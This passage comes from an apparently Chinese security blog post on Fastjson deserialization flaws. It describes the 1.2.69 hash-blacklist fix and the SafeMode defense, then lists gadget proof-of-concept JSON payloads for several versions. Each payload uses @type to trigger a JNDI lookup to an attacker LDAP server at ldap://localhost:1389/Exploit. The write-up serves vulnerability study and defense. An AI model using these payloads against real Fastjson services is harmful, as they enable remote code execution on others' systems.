看GitHub官方的diff，主要在ParserConfig.java中：[https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4](https://github.com/alibaba/fastjson/compare/1.2.68…1.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4)

对比看到expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1268PackFix.png)

网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：

| 版本   | 十进制Hash值          | 十六进制Hash值      | 类名                    |
| ------ | --------------------- | ------------------- | ----------------------- |
| 1.2.69 | 5183404141909004468L  | 0x47ef269aadc650b4L | java.lang.Runnable      |
| 1.2.69 | 2980334044947851925L  | 0x295c4605fd1eaa95L | java.lang.Readable      |
| 1.2.69 | -1368967840069965882L | 0xed007300a7b227c6L | java.lang.AutoCloseable |

这就简单粗暴地防住了这几个类导致的绕过问题了。

### SafeMode

官方参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode

在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。

代码中设置开启SafeMode如下：

JAVA

```
ParserConfig.getGlobalInstance().setSafeMode(true);
```

开启之后，就完全禁用AutoType即`@type`了，这样就能防御住Fastjson反序列化漏洞了。

具体的处理逻辑，是放在`checkAutoType()`函数中的前面，获取是否设置了SafeMode，如果是则直接抛出异常终止运行：

![img](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/safeModeDefense.png)

## 0x06 其他一些绕过黑名单的Gadget

这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。

### 1.2.59

com.zaxxer.hikari.HikariConfig类PoC：

JSON

```
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

### 1.2.61

org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：

JSON

```
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}
```

### 1.2.62

org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：

JSON

```
{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://localhost:1389/Exploit"}, "namespace":""}
```

### 1.2.68

org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：

JSON

```
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

com.caucho.config.types.ResourceRef类PoC：

JSON

```
{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://localhost:1389/Exploit", "value": {"$ref":"$.value"}}
```

### 未知版本

org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：

JSON

```
{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```

org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：

JSON

```
{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```

## 参考资料

[Fastjson反序列化漏洞(4)—1.2.68版本 – JohnFrod’s Blog](https://johnfrod.top/安全/704/)
[（安全客首发）Fastjson系列六——1.2.48-1.2.68反序列化漏洞 [ Mi1k7ea \]](https://www.mi1k7ea.com/2021/02/08/Fastjson系列六——1-2-48-1-2-68反序列化漏洞/#写入文件)